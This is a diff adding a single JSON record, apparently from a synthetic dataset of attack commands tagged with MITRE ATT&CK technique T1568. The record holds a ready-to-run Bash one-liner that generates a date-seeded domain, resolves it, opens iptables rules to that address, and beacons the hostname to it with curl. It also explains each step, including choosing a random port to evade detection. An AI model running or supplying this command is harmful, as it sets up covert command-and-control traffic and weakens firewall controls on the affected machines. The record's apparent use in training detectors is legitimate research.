@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'seed=$(date -u +%Y%m%d); for tld in xyz club online; do d=\"cdn-$seed.$tld\"; ip=$(dig +short A \"$d\" | head -n1); if [ -n \"$ip\" ]; then port=$(shuf -i 49152-65535 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS --connect-timeout 5 --retry 1 --max-time 10 \"http://$d:$port/beacon?id=$(hostname)-$(date +%s)\"; break; fi; done'",
+  "explanation": "Generates a date-seeded domain (DGA), resolves it, opens iptables egress/ingress rules to the resolved IP on a random high port, and initiates a beacon over that port. Emphasizes dynamic DNS resolution to locate C2.",
+  "rationale_steps": [
+    "Create a time-based DGA domain",
+    "Resolve the domain to an IP via dig",
+    "Choose a random high port to reduce detection",
+    "Insert iptables rules permitting only that IP:port",
+    "Beacon to the dynamically resolved endpoint with curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-ce65493f",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
